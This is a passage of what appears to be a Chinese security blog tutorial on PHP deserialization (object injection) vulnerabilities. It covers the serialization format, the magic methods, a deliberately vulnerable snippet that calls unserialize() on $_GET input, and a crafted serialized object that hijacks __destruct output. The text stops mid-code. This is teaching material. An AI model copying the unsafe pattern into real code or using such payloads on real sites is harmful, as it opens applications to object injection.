

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/wo02ie/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/wo02ie/photo/main/icon.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
  <title>反序列化漏洞 - wo02ie</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>wo02ie</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/wo02ie/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="反序列化漏洞">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-05-29 20:24" pubdate>
        May 29, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      10.4k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      153
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">反序列化漏洞</h1>
            
            <div class="markdown-body">
              <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>类中，实例化生成一个对象，而把这个对象转化成字符串，这个操作就是序列化。反过来，将字符串转化成类模板形式的对象，就是反序列化。两者结合就可以方便地存储和传输数据。</p>
<p>不同编程语言序列化后的存储文件不同，当然语法也不相同</p>
<p>我们以php语言为例</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210529193530927.png" srcset="/img/loading.gif" lazyload></p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">serialize()</td>
<td align="center">将一个对象转换成一串字符串</td>
</tr>
<tr>
<td align="center">unserialize()</td>
<td align="center">将一串字符串转换成一个对象</td>
</tr>
</tbody></table>
<h2 id="PHP序列化的格式"><a href="#PHP序列化的格式" class="headerlink" title="PHP序列化的格式"></a>PHP序列化的格式</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">a -<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>b - boolean<br>d -<span class="hljs-built_in"> double</span><br><span class="hljs-built_in"></span>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class//最常用的复合类型<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    public $a = <span class="hljs-string">&#x27;ThisA&#x27;</span>;<br>    protected $b = <span class="hljs-string">&#x27;ThisB&#x27;</span>;<br>    private $c = <span class="hljs-string">&#x27;ThisC&#x27;</span>;<br>    public <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;this is a test!&#x27;</span>;<br>    &#125;<br>&#125;<br>$test = <span class="hljs-keyword">new</span> Test();<br>var_dump(serialize($test));<br>echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(unserialize(serialize($test)))<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">string</span>(<span class="hljs-number">84</span>) <span class="hljs-string">&quot;O:4:&quot;</span>Test<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:5:&quot;</span>ThisA<span class="hljs-string">&quot;;s:4:&quot;</span>*b<span class="hljs-string">&quot;;s:5:&quot;</span>ThisB<span class="hljs-string">&quot;;s:7:&quot;</span>Testc<span class="hljs-string">&quot;;s:5:&quot;</span>ThisC<span class="hljs-string">&quot;;&#125;&quot;</span><br><br><span class="hljs-keyword">object</span>(Test)#<span class="hljs-number">2</span> (<span class="hljs-number">3</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisA&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-keyword">protected</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisB&quot;</span> [<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-keyword">private</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisC&quot;</span> &#125; <br></code></pre></td></tr></table></figure>

<h4 id="public-protected-private在序列化时的区别"><a href="#public-protected-private在序列化时的区别" class="headerlink" title="public/protected/private在序列化时的区别"></a>public/protected/private在序列化时的区别</h4><p>这个类的三个成员变量由于变量前的修饰不同，在序列化出来后显示的也不同。</p>
<p><code>s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;</code> ：以 <code>;</code>分开变量名和变量值，变量名为1个字符的a，变量值为”ThisA”</p>
<p><code>s:4:&quot;*b&quot;;s:5:&quot;ThisA&quot;;</code>：多了 <code>*</code>，用以区分 protected 修饰符，另外实际页面中会出现乱码，实际上 protected属性的表示方式是在变量名前加个<code>%00%00</code></p>
<p><code>s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;</code>： 在变量名前加上了<code>%00类名%00</code></p>
<p>可以看到， 序列化后的字符串中并没有包含这个test方法的信息;反序列化后，类的成员变量被还原了，但是类方法没有被还原。</p>
<p>因为<strong>序列化不保存方法</strong></p>
<blockquote>
<p>①private属性序列化的时候会在两侧加入空字节，private属性序列化时会在变量前面加上加上类名</p>
<p>②序列化不保存方法</p>
</blockquote>
<h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct()<span class="hljs-comment">//类的构造函数</span><br><br>__destruct()<span class="hljs-comment">//类的析构函数</span><br><br>__call()<span class="hljs-comment">//在对象中调用一个不可访问方法时调用</span><br><br>__callStatic()<span class="hljs-comment">//用静态方式中调用一个不可访问方法时调用</span><br><br>__get()<span class="hljs-comment">//获得一个类的成员变量时调用</span><br><br>__set()<span class="hljs-comment">//设置一个类的成员变量时调用</span><br><br>__isset()<span class="hljs-comment">//当对不可访问属性调用isset()或empty()时调用</span><br><br>__unset()<span class="hljs-comment">//当对不可访问属性调用unset()时被调用。</span><br><br>__sleep()<span class="hljs-comment">//执行serialize()时，先会调用这个函数</span><br><br>__wakeup()<span class="hljs-comment">//执行unserialize()时，先会调用这个函数</span><br><br>__toString()<span class="hljs-comment">//类被当成字符串时的回应方法</span><br><br>__invoke()<span class="hljs-comment">//调用函数的方式调用一个对象时的回应方法</span><br><br>__set_state()<span class="hljs-comment">//调用var_export()导出类时，此静态方法会被调用。</span><br><br>__clone()<span class="hljs-comment">//当对象复制完成时调用</span><br><br>__autoload()<span class="hljs-comment">//尝试加载未定义的类</span><br><br>__debugInfo()<span class="hljs-comment">//打印所需调试信息</span><br></code></pre></td></tr></table></figure>

<h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>创建对象时就会执行的构造函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct test&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;Damn&#x27;</span>, <span class="hljs-string">&#x27;zZ&#x27;</span>, <span class="hljs-string">&#x27;10086&#x27;</span>);<br><br><span class="hljs-comment">//输出：__construct test</span><br></code></pre></td></tr></table></figure>

<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>对象的所有引用都被删除或者当对象被显式销毁时执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct test&quot;</span>;<br>    &#125;     <br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User();<br>    <br><span class="hljs-comment">//输出：__destruct test</span><br></code></pre></td></tr></table></figure>

<h3 id="Tostring"><a href="#Tostring" class="headerlink" title="__Tostring"></a>__Tostring</h3><p>当一个类对象被当成字符串时必须返回一个字符串 否则产生<strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误</p>
<p>情形有</p>
<ul>
<li><p><input checked="" disabled="" type="checkbox">  echo ($obj)/print($obj)</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  字符串连接</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  格式化字符串</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  字符串==比较，比较的时候会转换参数类型</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  格式化SQL语句，绑定参数</p>
</li>
<li><p><input checked="" disabled="" type="checkbox">  数组中有字符串</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> TestClass(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br><br><span class="hljs-comment">//输出：hello</span><br></code></pre></td></tr></table></figure>

<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个<strong>E_NOTICE</strong>级别的错误。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">const</span> SITE = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;sucker&#x27;</span>, <span class="hljs-string">&#x27;damnGG&#x27;</span>, <span class="hljs-string">&#x27;f**k&#x27;</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br><br><span class="hljs-comment">//输出：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:8:&quot;nickname&quot;;s:6:&quot;damnGG&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>对象反序列化时会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code>方法，预先准备对象需要的资源。如果不存在，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-keyword">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:6:&quot;damnGG&quot;;s:4:&quot;f**k&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$user_ser</span>));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">object(User)#1 (5) &#123;</span><br><span class="hljs-comment">  [&quot;username&quot;]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;nickname&quot;]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;damnGG&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;f**k&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/20201112222505683.png" srcset="/img/loading.gif" lazyload></p>
<p>修改序列化后的字符串 然后传回代码进行反序列化 而此时恶意代码就被执行了</p>
<h3 id="覆盖输出"><a href="#覆盖输出" class="headerlink" title="覆盖输出"></a>覆盖输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//得到 O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>传参回去<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210612154244475.png" srcset="/img/loading.gif" lazyload></p>
<p>反序列化后就会调用__destruct函数，同时覆盖$test=demo输出hello world</p>
<h3 id="回马枪"><a href="#回马枪" class="headerlink" title="回马枪"></a>回马枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> foo();<br>    &#125;<br>    <span 